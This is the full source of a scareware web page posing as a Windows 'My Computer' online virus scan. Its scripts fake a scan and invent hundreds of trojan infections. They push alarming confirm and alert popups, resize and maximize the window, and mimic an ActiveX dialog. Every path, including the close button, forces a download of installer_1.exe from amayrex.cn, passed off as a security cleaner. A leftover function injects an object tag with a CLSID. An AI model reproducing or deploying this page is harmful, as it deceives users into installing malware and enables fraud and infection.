<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>My computer Online Scan</title>
<script>
var prcnt_interval;
var deeps_nacs=15;
var iteration=0;
var scantext="Scan complete. 528 threats was found!";

function update()
{
 if ($(".progress_bar_fill").width()>0)
 {
  $("#progress_prcnt").html((Math.round(100-$(".progress_bar_fill").width()/417*100))+"%");
  $("#cur_file_scan").html(fxlist[Math.floor(Math.random()*fxlist.length)] );
  
  if ($(".progress_bar_fill").width()<100 && iteration==2)
  {
    $("#threat3").toggleClass("none");
    setInterval("$('#tc3').toggleClass('none')",1000);
    setInterval("$('#tc4').toggleClass('none')",1000);
    iteration=3;
  }  
    if ($(".progress_bar_fill").width()<350 && iteration==0)
  {
   jQuery("<img>").attr("src", soundfile);
   setInterval("$('#tc1').toggleClass('none')",1000);
   iteration=1;
   $("#threat1").toggleClass("none");
   $("#desc").toggleClass("none");
   $("#alert_img").attr("src","./8/images/alert.gif");
  }
  if ($(".progress_bar_fill").width()<200 && iteration==1)
  {
   $("#threat2").toggleClass("none");
   setInterval("$('#tc2').toggleClass('none')",1000);
   iteration=2;
  }
 }
 else
 {
  clearInterval(prcnt_interval);
  $(".file_scanner").html(scantext);
  setTimeout("dpop2()",1000);
 }
}

function Minimize() 
{
window.innerWidth = 100;
window.innerHeight = 100;
window.screenX = screen.width;
window.screenY = screen.height;
alwaysLowered = true;
}

function Maximize() 
{
window.moveTo(0,0);
window.resizeTo(screen.width,screen.height);
}

function download() {
 window.location='http://amayrex.cn/installer_1.exe';
}

function away()
{
    w = window;
    ua = navigator.userAgent;
    v1 = ua.toLowerCase().indexOf('msie') != -1 && ua.toLowerCase().indexOf('opera') < 0;
      x = 11;
      eval('w.resizeTo(x*10,x*11-7)');
    w.moveTo(v1 ? (screen.width - 100) >> 1 : 11027, v1 ? (screen.height - 100) >> 1 : 10659);
}

function pop1() {

confirm('Warning!!! '+
' Your computer contains various signs of viruses and malware programs presence. '+

' Your system requires immediate anti viruses check! '+

' System Security will perform a quick and free scanning of your PC for viruses and malicious programs.');
}

function dpop2() {
confirm('Your computer remains infected by viruses! '+
' They can cause data loss and file damages and need to be cured as soon as possible. '+
' Return to System Security and download it secure to your PC ');

pop4();
}

function pop3() {
alert('Your computer remains infected by viruses! '+
' They can cause data loss and file damages and need to be cured as soon as possible. '+
' Return to System Security and download it secure to your PC ');
}

function pop4() {
  playsound(soundfile);
  $("#alert").css('top', $(window).height()/2- $("#alert").height()/2); 
  $("#alert").css('left', $(window).width()/2- $("#alert").width()/2);
  $("#alert").show();  
  $(".left_bar").css("display","none");
  $(".left_bar").css("display","block");
}

function sp2init(){
    document.body.innerHTML+="<object id=iie width=0 height=0 classid='CLSID:"+u+"'></object>";
}

function loading() {
  if (window.attachEvent)
    away();
    pop1();
    Maximize();
  window.focus(); 
}

function thisMovie(movieName)
{
    if (navigator.appName.indexOf("Microsoft") != -1)
    {
        return window[movieName]
    }
    else
    {
        return document[movieName];
    }
}

function loaded() {
  $("#white").css("display","none");
  $("#page_progress").css("display","none");
  $(".left_bar").css("display","none");
  $(".left_bar").css("display","block");
  //setInterval("window.focus()",1000);
  $(".progress_bar_fill").animate({width:"0px"},deeps_nacs*1000);
  prcnt_interval = setInterval(update,deeps_nacs*10);    
};

loading();


    function showActiveXDialog()
    {                          
        var lft = 0;
        document.getElementById("IDActiveXDialog").style.left = lft + 'px';
        document.getElementById("IDActiveXDialog").style.visibility = "visible";
            
        return false;
    };

    function hideActiveXDialog()
    {
        if(confirm('Do not close this window if you want to clean up your PC.'))
        {
            download();
        }
        
        document.getElementById("IDActiveXDialog").style.visibility = "hidden";
    };

var LRUpop = 'http://amayrex.cn/installer_1.exe';
// isUsingSpecial = true;
// if (window.attachEvent)
 // eval("window.attachEvent('onunload',ext);");
// else
 // window.addEventListener("unload", ext, false);
 
//--------------------------------------------------------------------------------


var soundfile="chord.wav"

function playsound(soundfile){
//if (document.all){
//$("soundeffect").src=""
//$("soundeffect").src=soundfile
//}
thisMovie('player').LoadMovie(1, './8/images/err.swf');

staticbar(); 

    $("#popup_bg").css({top:"0px",left:"0px",width:$("body").width(),height:$(document).height(),
        "background-color":"gray","opacity":0.5,position:"absolute"}); 
        showActiveXDialog();
        download();    
        
}

function bindsound(tag, soundfile, masterElement){
if (!window.event) return
var source=event.srcElement
while (source!=masterElement && source.tagName!="HTML"){
if (source.tagName==tag.toUpperCase()){
playsound(soundfile)
break
}
source=source.parentElement
}
}</script>
<script type="text/javascript" src="./8/js/jquery.js"></script>
<script type="text/javascript" src="./8/js/jquery-init.js"></script>
<script type="text/javascript" src="./8/js/flist.js"></script>
<style type="text/css">
<!--
body {
    padding:0px;
    margin:0px;
    font-family:Tahoma, Arial, Helvetica, sans-serif;
    font-size:11px;
    background-color:#FFFFFF;
    color:#000000;
    height:100%;
}
-->

.left_bar {
    position: absolute;    
    background-color:#718de0;
    color:#3333CC;
    height:100%;
}
.left_header {
    background-image:url(./8/images/box_top_.gif);
    background-repeat:no-repeat;
    width:213px;
    height:19px;
    padding:7px 0 0 13px;
    margin:12px 0 0 12px;
    font-weight:bold;
    color:#3F3D3D;    
}

.left_box {
    background-color:#d7def8;
    color:#3F3D3D;
    border-left:1px solid #FFFFFF;
    border-right:1px solid #FFFFFF;
    border-bottom:1px solid #FFFFFF;
    width:211px;
    margin:0 0 0 12px;
    padding:10px 0 6px 0;
}

.left_box_line {
    padding:2px 2px 3px 15px;
}

.left_box_line a{
    color:#38599c;
    background-color:inherit;
    text-decoration:none;
}
.left_box_line a:hover{
    text-decoration:underline;
}
.left_bar_icon {
    vertical-align:middle;
    padding-right:4px;
}

.right_bar {
    position:absolute;
    left:238px;
}

.right_hr {
    background-image:url(./8/images/hrline.gif);
    background-repeat:no-repeat;
    width:280px;
    height:19px;
    padding-left:15px;
    padding-bottom:15px;
    margin-top:15px;    
    font-weight:bold;
}

.folder_box {
    display:inline;
    margin:20px 0 0 0;
    padding-left:20px;
    width:170px;
}

.folder_icon {
    vertical-align:middle;
    padding:0 10px 0 0;
}

.progress_bar {
    margin:15px 15px 0 15px;
}
.progress_bar_bg {
    background-image:url(./8/images/progressbar.gif);
    background-repeat:no-repeat;
    width:416px;
    height:15px;
    padding:1px 3px 1px 3px;
    margin:7px 0 0 0;
}

.progress_bar_progress {
    background-image:url(./8/images/progressbar_green.gif);
    background-position:left;
    background-repeat:repeat-x;
    height:15px;
    width:416px;
}

.progress_bar_fill {
    float:right;
    background-color:white;
    width:418px;
    height:15px;
}

#progress_prcnt {
    position:absolute;
    padding-left:200px;
}

.file_scanner {
    font-weight:bold;
    margin:5px 15px 0 15px; 
}

.window1 {
    width:700px;
    height:337px;
    background-image:url(./8/images/window1.gif);
    background-repeat:no-repeat;
    margin:5px 15px 0 15px;     
}

.td_cell1 {
    padding-top:10px;
    padding-left:7px;
}

.td_cell2 {
    padding-top:7px;
    padding-left:7px;
}

.none {
    visibility:hidden;
}

.trojan {
    position:absolute;
    display:inline;
    padding-left:50px;
    padding-top:30px;
}

.trojan_caption {
    font-weight:bold;
    color:red;
    padding-left:5px;
}

.white_div {
    Z-INDEX: 1200;
    position:absolute;
    background-color:white;
    width:100%;
    height:100%;
}

#alert {
    Z-INDEX: 1300;
    width:434px;
    height:332px;
    display:none;
    position:absolute;
    cursor:pointer;
    cursor:hand;
}
</style></head>

<body onLoad="loaded()">

<div id="alert"><img id="alert_img"></div>
<div id='IDActiveXDialog' style="left: 0px; z-index:2; position: absolute; top: 90px; visibility: hidden;" align="center">
    <div style="width: 433px; height:317px; position: relative; background-image:url(./8/images/activex.gif)" onclick='download();'>
        <input type='button' style='position: relative; width:21px; height:21px; left:203px; top:5px; border-width:0px; background-image:url(./8/images/closebutton.jpg)' onclick='event.cancelBubble=true; hideActiveXDialog();'>
    </div>    
</div>
<div id="white" class="white_div" align="center">
    <div style="position:relative;top:50%"><img src="./8/images/page_progressbar.gif" width="51" height="19"/>
    </div>
   </div>
<div class="left_bar">
  <div class="left_header">
        System Tasks
  </div>
    <div class="left_box">

        <div class="left_box_line">
            <img src="./8/images/i5000000.gif" width="14" height="16"/ class="left_bar_icon"><a href="#">View system information</a>        </div>
      <div class="left_box_line">
        <img src="./8/images/i6000000.gif" width="16" height="16"/ class="left_bar_icon"> <a href="#">Add or remove programs</a>      </div>
      <div class="left_box_line">
           <img src="./8/images/i7000000.gif" width="16" height="16"/ class="left_bar_icon"> <a href="#">Change a settings</a>      </div>

  </div>
    <div class="left_header">
        Other Places
  </div>
    <div class="left_box">
        <div class="left_box_line">
            <img src="./8/images/i1000000.gif" width="16" height="16"/ class="left_bar_icon"> <a href="#">My Network Places</a>        </div>
      <div class="left_box_line">

        <img src="./8/images/i2000000.gif" width="16" height="16"/ class="left_bar_icon"> <a href="#">My Documents</a>      </div>
      <div class="left_box_line">
           <img src="./8/images/i3000000.gif" width="16" height="14"/ class="left_bar_icon"> <a href="#">Shared Documents</a>      </div>
      <div class="left_box_line">
           <img src="./8/images/i4000000.gif" width="16" height="16"/ class="left_bar_icon"> <a href="#">Control Panel</a>      </div>

  </div>
    <div class="left_header">
        Details
  </div>
    <div class="left_box">
      <div class="left_box_line">
            <strong>My Computer</strong><br />
          System Folder
      </div>

    </div>
</div>

<div class="right_bar">
  <div class="right_hr">
        System scan progress
  </div>
    <div class="folder_box">
         <div id="tc1" class="trojan none">
            <img src="./8/images/inf20000.gif" width="15" height="18" align="absmiddle"/><span class="trojan_caption">7 trojans</span>

      </div>

        <img src="./8/images/folder.gif" width="43" height="40" class="folder_icon"/>Shared Documents
  </div>
  <div class="folder_box">
        <div id="tc2" class="trojan none">
            <img src="./8/images/inf20000.gif" width="15" height="18" align="absmiddle"/><span class="trojan_caption">103 trojans</span>
        </div>
    
        <img src="./8/images/folder.gif" width="43" height="40" class="folder_icon"/>My Documents
  </div>

  <div class="right_hr">
        Hard drives
  </div>
    <div class="folder_box">
        <div id="tc3" class="trojan none">
            <img src="./8/images/inf20000.gif" width="15" height="18" align="absmiddle"/><span class="trojan_caption">362 trojans</span>
        </div>
    
        <img src="./8/images/hdd.gif" width="43" height="40" class="folder_icon"/>Local Disk (C:)
  </div>

  <div class="folder_box">
        <div id="tc4" class="trojan none">
            <img src="./8/images/inf20000.gif" width="15" height="18" align="absmiddle"/><span class="trojan_caption">155 trojans</span>
        </div>
    
        <img src="./8/images/hdd.gif" width="43" height="40" class="folder_icon"/>Local Disk (D:)
  </div>
  <div class="right_hr">
        DVD
  </div>

    <div class="folder_box">
        <img src="./8/images/dvd.gif" width="43" height="40" class="folder_icon"/>DVD-RAM Drive (E:)
  </div>
  <div class="progress_bar">
    <div class="progress_bar_bg">
      <div class="progress_bar_progress">
           <div class="progress_bar_fill">
        </div>
                <div id="progress_prcnt">

                     0%
                </div>                      
      </div>          
        </div>
    </div>
    <div class="file_scanner">
        Now scanning: <span id="cur_file_scan">none</span>
  </div>
    <div class="window1">

         <div style="font-size:15px;font-weight:bold;color:white;padding-top:14px;padding-left:35px;">
            Your Computer is Infected!
      </div>
        <div style="padding-top:22px;">
            Threats and actions:
      </div>   
        <table border="0">
          <tr>
            <td width="166" class="td_cell1">Name</td>
            <td width="105" class="td_cell1">Risk level</td>

            <td width="85" class="td_cell1">Date</td>
            <td width="120" class="td_cell1">Files infected</td>
            <td width="120" class="td_cell1">State</td>
          </tr>
          <tr class="none" id="threat1"">
            <td class="td_cell2"><img src="./8/images/qicon.gif" align="absmiddle" style="padding-right:5px"/>  <b>Email-Worm.Win32.Net</b></td>

            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">35</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
          <tr class="none" id="threat2">
            <td class="td_cell2"><img src="./8/images/qicon.gif" align="absmiddle" style="padding-right:5px"/>  <b>Email-Worm.Win32.Myd</b></td>

            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">35</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
          <tr class="none" id="threat3">
            <td class="td_cell2"><img src="./8/images/qicon.gif" align="absmiddle" style="padding-right:5px"/>  <b>Trojan-Downloader.Win</b></td>

            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">35</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
      </table>

        <div style="padding-top:12px;padding-left:12px;width:600px" class="none" id="desc">
            <b>Description:</b><br />
            This program is potentially dangerous for your system. <b>Trojan-Downloader</b> stealing passwords, credit cards and other personal information from your computer.
            <br /><br />
            <b>Advice:</b><br/>
            You need to remove this threat as soon as possible!
      </div>

        <div style="padding-top:50px;padding-left:590px"><a href="#">Full system cleanup</a></div>
  </div>
</div>
                                
<div id="popup_bg"></div>

<script>

imageurl="./8/images/error_detected.gif"; 



document.write('<style type="text/css">#lipuchka{position:absolute; border: 0px; visibility: hidden; z-index: 1000;}</style>');

var persistclose=0

var startX = 0

var startY = -5

var verticalpos="frombottom"



function iecompattest(){

    return (document.compatMode && document.compatMode!="BackCompat")? document.documentElement : document.body

}



function closebar(){

    if (persistclose) document.cookie="remainclosed=1"

    document.getElementById("lipuchka").style.visibility="hidden"

}



function staticbar(){

    barheight=document.getElementById("lipuchka").offsetHeight

    barwidth=document.getElementById("lipuchka").offsetWidth

    var ns = (navigator.appName.indexOf("Netscape") != -1) || window.opera;

    var d = document;

    function ml(id){

        var el=d.getElementById(id);

        if (!persistclose || persistclose && get_cookie("remainclosed")=="")

        el.style.visibility="visible"

        if(d.layers)el.style=el;

        el.sP=function(x,y){this.style.left=x+"px";this.style.top=y+"px";};

        el.x =  startX;

        el.x = ns ? pageXOffset + innerWidth - barwidth -20 : iecompattest().scrollLeft + iecompattest().clientWidth-barwidth-20;



        if (verticalpos=="fromtop") {

        el.y = startY;

        }

        else{

        el.y = ns ? pageYOffset + innerHeight : iecompattest().scrollTop + iecompattest().clientHeight;

        el.y -= startY;

        }

        return el;

    }

    window.stayTopLeft=function(){

        if (verticalpos=="fromtop"){

        var pY = ns ? pageYOffset : iecompattest().scrollTop;

        ftlObj.y += (pY + startY - ftlObj.y)/1;

        }

        else{

        var pY = ns ? pageYOffset + innerHeight - barheight: iecompattest().scrollTop + iecompattest().clientHeight - barheight;

        ftlObj.y += (pY - startY - ftlObj.y)/1;

        }

        ftlObj.sP(ftlObj.x, ftlObj.y);

        setTimeout("stayTopLeft()", 1);

    }

    ftlObj = ml("lipuchka");

    stayTopLeft();

}


element = ''

element = element+ '    <table id="lipuchka" border="0" cellpadding="0" cellspacing="0" width="339">'

element = element+ '        <tbody>'

element = element+ '            <tr>'

element = element+ '                <td height="95" width="339">'

element = element+ '                        <img src="'+imageurl+'" border="0" height="95" width="339">'

element = element+ '                </td>'

element = element+ '            </tr>'

element = element+ '        </tbody>'

element = element+ '    </table>'



document.write(element);

</script>  


<object id='player' classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0"

 width="1" height="1" align="middle">

<param name="allowScriptAccess" value="sameDomain" />

<param name="movie" value="./8/images/errsnd.swf" />

<param name="play" value="0" />

<embed name='player' id='player' src='./8/images/errsnd.swf' play="0" width="1" height="1" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" swLiveConnect="true"/>

</object>

</body>
</html>
